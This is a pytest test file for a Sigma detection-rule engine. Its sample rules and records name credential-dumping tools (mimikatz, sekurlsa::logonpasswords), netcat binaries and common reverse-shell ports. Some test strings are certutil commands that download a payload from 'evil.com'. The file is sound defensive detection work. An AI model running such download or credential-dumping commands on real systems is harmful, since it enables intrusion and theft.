"""Tests for the Sigma rule engine."""

from __future__ import annotations

import pytest

from overwatch.sigma_engine import (
    FieldMapper,
    RuleEvaluator,
    SigmaEngine,
    SigmaLevel,
    SigmaParser,
    SigmaRule,
    SigmaStatus,
    SigmaTag,
    _ConditionEvaluator,
    _Modifier,
    _match_selection,
)

# ---------------------------------------------------------------------------
# Minimal valid Sigma rule YAML
# ---------------------------------------------------------------------------

MINIMAL_RULE = """
title: Test PowerShell Execution
id: 12345678-1234-1234-1234-123456789abc
status: experimental
description: Detects suspicious PowerShell commandline
author: Test Author
date: 2024/01/01
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\\\\powershell.exe'
        CommandLine|contains: 'Invoke-Expression'
    condition: selection
level: high
tags:
    - attack.t1059.001
    - attack.execution
falsepositives:
    - Administrative scripts
"""

MULTI_SELECTION_RULE = """
title: Suspicious Network Connection
id: 22345678-1234-1234-1234-123456789abc
status: stable
description: Detects connection to suspicious port
logsource:
    category: network_connection
    product: windows
detection:
    selection_proc:
        Image|contains: 'cmd.exe'
    selection_net:
        DestinationPort:
            - 4444
            - 1337
            - 31337
    condition: selection_proc and selection_net
level: critical
tags:
    - attack.t1071
"""

KEYWORD_RULE = """
title: Mimikatz Keyword Detection
id: 33345678-1234-1234-1234-123456789abc
status: test
description: Detects mimikatz in any field
logsource:
    category: process_creation
detection:
    keywords:
        - mimikatz
        - sekurlsa
        - lsadump
    condition: keywords
level: critical
"""

OR_CONDITION_RULE = """
title: Suspicious Tool Usage
id: 44345678-1234-1234-1234-123456789abc
status: stable
description: Detects multiple suspicious tools
logsource:
    category: process_creation
detection:
    selection_a:
        Image|endswith: '\\\\nc.exe'
    selection_b:
        Image|endswith: '\\\\ncat.exe'
    condition: 1 of selection_*
level: high
"""

NOT_CONDITION_RULE = """
title: Non-Admin PowerShell
id: 55345678-1234-1234-1234-123456789abc
status: experimental
description: Detects PS from non-system paths
logsource:
    category: process_creation
detection:
    selection:
        Image|endswith: '\\\\powershell.exe'
    filter:
        Image|startswith:
            - 'C:\\\\Windows\\\\System32\\\\'
            - 'C:\\\\Windows\\\\SysWOW64\\\\'
    condition: selection and not filter
level: medium
"""

REGEX_RULE = """
title: LOLBAS via Regex
id: 66345678-1234-1234-1234-123456789abc
status: experimental
description: Detects LOLBAS usage via regex
logsource:
    category: process_creation
detection:
    selection:
        CommandLine|re: '(certutil|bitsadmin).*(download|transfer)'
    condition: selection
level: high
"""

CIDR_RULE = """
title: Private Network Connection
id: 77345678-1234-1234-1234-123456789abc
status: experimental
description: Connection to RFC1918 space
logsource:
    category: network
detection:
    selection:
        DestinationIP|cidr: '10.0.0.0/8'
    condition: selection
level: informational
"""

DEPRECATED_RULE = """
title: Old Rule
id: 88345678-1234-1234-1234-123456789abc
status: deprecated
description: Deprecated
logsource:
    category: process_creation
detection:
    selection:
        Image: 'c:\\\\bad.exe'
    condition: selection
level: low
"""


# ---------------------------------------------------------------------------
# SigmaTag tests
# ---------------------------------------------------------------------------

class TestSigmaTag:
    def test_parse_attack_technique(self):
        tag = SigmaTag.parse("attack.t1059.001")
        assert tag.namespace == "attack"
        assert tag.name == "t1059.001"
        assert tag.attack_technique == "T1059.001"

    def test_parse_non_attack(self):
        tag = SigmaTag.parse("car.2020-05-001")
        assert tag.attack_technique is None

    def test_parse_no_dot(self):
        tag = SigmaTag.parse("mytag")
        assert tag.namespace == "mytag"
        assert tag.name == ""


# ---------------------------------------------------------------------------
# SigmaParser tests
# ---------------------------------------------------------------------------

class TestSigmaParser:
    def test_parse_minimal(self):
        parser = SigmaParser()
        rule = parser.parse_string(MINIMAL_RULE)
        assert rule is not None
        assert rule.title == "Test PowerShell Execution"
        assert rule.level == SigmaLevel.HIGH
        assert rule.status == SigmaStatus.EXPERIMENTAL

    def test_parse_tags(self):
        parser = SigmaParser()
        rule = parser.parse_string(MINIMAL_RULE)
        assert len(rule.tags) == 2
        assert "T1059.001" in rule.attack_techniques

    def test_parse_logsource(self):
        parser = SigmaParser()
        rule = parser.parse_string(MINIMAL_RULE)
        assert rule.logsource["category"] == "process_creation"
        assert rule.logsource["product"] == "windows"

    def test_parse_invalid_yaml(self):
        parser = SigmaParser()
        rule = parser.parse_dict(None)
        assert rule is None

    def test_parse_deprecated(self):
        parser = SigmaParser()
        rule = parser.parse_string(DEPRECATED_RULE)
        assert rule.status == SigmaStatus.DEPRECATED
        assert not rule.is_usable


# ---------------------------------------------------------------------------
# Modifier tests
# ---------------------------------------------------------------------------

class TestModifier:
    def test_contains(self):
        assert _Modifier.apply("Hello World", "world", ["contains"])
        assert not _Modifier.apply("Hello World", "xyz", ["contains"])

    def test_startswith(self):
        assert _Modifier.apply("cmd.exe /c whoami", "cmd", ["startswith"])
        assert not _Modifier.apply("powershell.exe", "cmd", ["startswith"])

    def test_endswith(self):
        assert _Modifier.apply("C:\\Windows\\powershell.exe", "powershell.exe", ["endswith"])
        assert not _Modifier.apply("C:\\Windows\\cmd.exe", "powershell.exe", ["endswith"])

    def test_regex(self):
        assert _Modifier.apply("certutil -urlcache -split http://evil.com", "(certutil|bitsadmin).*(urlcache|download)", ["re"])
        assert not _Modifier.apply("normal command", "evil_pattern", ["re"])

    def test_cidr(self):
        assert _Modifier.apply("10.1.2.3", "10.0.0.0/8", ["cidr"])
        assert not _Modifier.apply("192.168.1.1", "10.0.0.0/8", ["cidr"])
        assert not _Modifier.apply("not-an-ip", "10.0.0.0/8", ["cidr"])

    def test_no_modifier_exact_match(self):
        assert _Modifier.apply("powershell.exe", "powershell.exe", [])
        assert not _Modifier.apply("cmd.exe", "powershell.exe", [])

    def test_windash(self):
        assert _Modifier.apply("/c whoami", "-c whoami", ["windash"])
        assert _Modifier.apply("-c whoami", "/c whoami", ["windash"])

    def test_none_value(self):
        assert not _Modifier.apply(None, "something", ["contains"])


# ---------------------------------------------------------------------------
# Selection matching tests
# ---------------------------------------------------------------------------

class TestMatchSelection:
    def test_dict_selection_all_match(self):
        sel = {"Image|endswith": "\\\\powershell.exe", "CommandLine|contains": "Invoke-Expression"}
        record = {"Image": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "IEX (Invoke-Expression) ..."}
        matched, evidence = _match_selection(sel, record)
        assert matched
        assert "Image" in evidence

    def test_dict_selection_partial_fail(self):
        sel = {"Image|endswith": "\\\\powershell.exe", "CommandLine|contains": "mimikatz"}
        record = {"Image": "C:\\Windows\\powershell.exe", "CommandLine": "Get-Process"}
        matched, _ = _match_selection(sel, record)
        assert not matched

    def test_list_selection_keywords(self):
        sel = ["mimikatz", "sekurlsa"]
        record = {"CommandLine": "sekurlsa::logonpasswords", "User": "SYSTEM"}
        matched, evidence = _match_selection(sel, record)
        assert matched

    def test_list_selection_no_match(self):
        sel = ["mimikatz", "sekurlsa"]
        record = {"CommandLine": "Get-Process", "User": "SYSTEM"}
        matched, _ = _match_selection(sel, record)
        assert not matched

    def test_pattern_list_or(self):
        sel = {"DestinationPort": [4444, 1337, 31337]}
        matched, _ = _match_selection(sel, {"DestinationPort": "1337"})
        assert matched
        matched2, _ = _match_selection(sel, {"DestinationPort": "80"})
        assert not matched2

    def test_case_insensitive_field_lookup(self):
        sel = {"commandline|contains": "mimikatz"}
        record = {"CommandLine": "sekurlsa mimikatz lsa"}
        matched, _ = _match_selection(sel, record)
        assert matched


# ---------------------------------------------------------------------------
# RuleEvaluator tests
# ---------------------------------------------------------------------------

class TestRuleEvaluator:
    def test_match_powershell_rule(self):
        parser = SigmaParser()
        rule = parser.parse_string(MINIMAL_RULE)
        evaluator = RuleEvaluator(rule)

        record = {
            "Image": "C:\\Windows\\System32\\powershell.exe",
            "CommandLine": "powershell.exe -c Invoke-Expression 'Get-Process'",
        }
        match = evaluator.match(record)
        assert match is not None
        assert match.alert_title == "Test PowerShell Execution"
        assert match.severity == "high"

    def test_no_match(self):
        parser = SigmaParser()
        rule = parser.parse_string(MINIMAL_RULE)
        evaluator = RuleEvaluator(rule)

        record = {"Image": "C:\\Windows\\cmd.exe", "CommandLine": "cmd /c whoami"}
        assert evaluator.match(record) is None

    def test_deprecated_rule_no_match(self):
        parser = SigmaParser()
        rule = parser.parse_string(DEPRECATED_RULE)
        evaluator = RuleEvaluator(rule)
        record = {"Image": "c:\\bad.exe"}
        assert evaluator.match(record) is None

    def test_multi_selection_and(self):
        parser = SigmaParser()
        rule = parser.parse_string(MULTI_SELECTION_RULE)
        evaluator = RuleEvaluator(rule)

        # Both conditions met
        record = {"Image": "C:\\Windows\\cmd.exe", "DestinationPort": "4444"}
        assert evaluator.match(record) is not None

        # Only one condition met
        record2 = {"Image": "C:\\Windows\\cmd.exe", "DestinationPort": "80"}
        assert evaluator.match(record2) is None

    def test_keyword_rule(self):
        parser = SigmaParser()
        rule = parser.parse_string(KEYWORD_RULE)
        evaluator = RuleEvaluator(rule)

        record = {"CommandLine": "mimikatz.exe sekurlsa::logonpasswords"}
        assert evaluator.match(record) is not None

    def test_one_of_wildcard(self):
        parser = SigmaParser()
        rule = parser.parse_string(OR_CONDITION_RULE)
        evaluator = RuleEvaluator(rule)

        assert evaluator.match({"Image": "C:\\tools\\nc.exe"}) is not None
        assert evaluator.match({"Image": "C:\\tools\\ncat.exe"}) is not None
        assert evaluator.match({"Image": "C:\\Windows\\cmd.exe"}) is None

    def test_not_condition(self):
        parser = SigmaParser()
        rule = parser.parse_string(NOT_CONDITION_RULE)
        evaluator = RuleEvaluator(rule)

        # PS from non-system path - should match
        record = {"Image": "C:\\Users\\user\\powershell.exe"}
        assert evaluator.match(record) is not None

        # PS from system path - should NOT match (filtered out)
        record2 = {"Image": "C:\\Windows\\System32\\powershell.exe"}
        assert evaluator.match(record2) is None

    def test_regex_rule(self):
        parser = SigmaParser()
        rule = parser.parse_string(REGEX_RULE)
        evaluator = RuleEvaluator(rule)

        record = {"CommandLine": "certutil.exe -download -f http://evil.com payload.exe"}
        assert evaluator.match(record) is not None

        record2 = {"CommandLine": "certutil.exe -hashfile file.exe SHA256"}
        assert evaluator.match(record2) is None

    def test_cidr_rule(self):
        parser = SigmaParser()
        rule = parser.parse_string(CIDR_RULE)
        evaluator = RuleEvaluator(rule)

        assert evaluator.match({"DestinationIP": "10.50.100.200"}) is not None
        assert evaluator.match({"DestinationIP": "8.8.8.8"}) is None

    def test_field_mapper(self):
        parser = SigmaParser()
        rule = parser.parse_string(MINIMAL_RULE)
        # Map backend (ECS) field names -> Sigma generic names
        mapper = FieldMapper({"process.executable": "Image", "process.command_line": "CommandLine"})
        evaluator = RuleEvaluator(rule, field_mapper=mapper)

        record = {
            "process.executable": "C:\\Windows\\powershell.exe",
            "process.command_line": "Invoke-Expression Get-Creds",
        }
        assert evaluator.match(record) is not None

    def test_match_returns_attack_techniques(self):
        parser = SigmaParser()
        rule = parser.parse_string(MINIMAL_RULE)
        evaluator = RuleEvaluator(rule)
        record = {"Image": "C:\\Windows\\powershell.exe", "CommandLine": "Invoke-Expression 'evil'"}
        match = evaluator.match(record)
        assert match is not None
        assert "T1059.001" in match.attack_techniques


# ---------------------------------------------------------------------------
# SigmaEngine tests
# ---------------------------------------------------------------------------

class TestSigmaEngine:
    def test_load_and_evaluate(self):
        engine = SigmaEngine()
        engine.load_rule_string(MINIMAL_RULE)
        engine.load_rule_string(MULTI_SELECTION_RULE)
        assert engine.rule_count == 2

        record = {"Image": "C:\\Windows\\powershell.exe", "CommandLine": "Invoke-Expression 'evil'"}
        matches = engine.evaluate(record)
        assert len(matches) == 1
        assert matches[0].rule.title == "Test PowerShell Execution"

    def test_evaluate_batch(self):
        engine = SigmaEngine()
        engine.load_rule_string(MINIMAL_RULE)

        records = [
            {"Image": "C:\\Windows\\powershell.exe", "CommandLine": "Invoke-Expression 'x'"},
            {"Image": "C:\\Windows\\cmd.exe", "CommandLine": "whoami"},
            {"Image": "C:\\Windows\\SysWOW64\\powershell.exe", "CommandLine": "Invoke-Expression 'y'"},
        ]
        all_matches = list(engine.evaluate_batch(records))
        assert len(all_matches) == 2

    def test_rules_by_level(self):
        engine = SigmaEngine()
        engine.load_rule_string(MINIMAL_RULE)       # high
        engine.load_rule_string(MULTI_SELECTION_RULE)  # critical
        engine.load_rule_string(CIDR_RULE)          # informational

        high_plus = engine.rules_by_level(SigmaLevel.HIGH)
        assert len(high_plus) == 2

    def test_rules_for_logsource(self):
        engine = SigmaEngine()
        engine.load_rule_string(MINIMAL_RULE)
        engine.load_rule_string(CIDR_RULE)

        proc_rules = engine.rules_for_logsource(category="process_creation")
        assert len(proc_rules) == 1

        net_rules = engine.rules_for_logsource(category="network")
        assert len(net_rules) == 1

    def test_stats_tracking(self):
        engine = SigmaEngine()
        engine.load_rule_string(MINIMAL_RULE)
        engine.evaluate({"Image": "C:\\Windows\\powershell.exe", "CommandLine": "Invoke-Expression 'x'"})
        engine.evaluate({"Image": "C:\\Windows\\cmd.exe", "CommandLine": "whoami"})
        assert engine.stats["evaluated"] == 2
        assert engine.stats["matches"] == 1

    def test_summary(self):
        engine = SigmaEngine()
        engine.load_rule_string(MINIMAL_RULE)
        engine.load_rule_string(MULTI_SELECTION_RULE)
        summary = engine.summary()
        assert summary["total_rules"] == 2
        assert "high" in summary["by_level"] or "critical" in summary["by_level"]

    def test_clear(self):
        engine = SigmaEngine()
        engine.load_rule_string(MINIMAL_RULE)
        engine.clear()
        assert engine.rule_count == 0

    def test_no_rules_no_matches(self):
        engine = SigmaEngine()
        matches = engine.evaluate({"Image": "powershell.exe", "CommandLine": "Invoke-Expression 'x'"})
        assert matches == []

    def test_multiple_rules_multiple_matches(self):
        engine = SigmaEngine()
        engine.load_rule_string(MINIMAL_RULE)
        engine.load_rule_string(KEYWORD_RULE)

        record = {
            "Image": "C:\\tools\\powershell.exe",
            "CommandLine": "Invoke-Expression mimikatz",
        }
        matches = engine.evaluate(record)
        assert len(matches) == 2
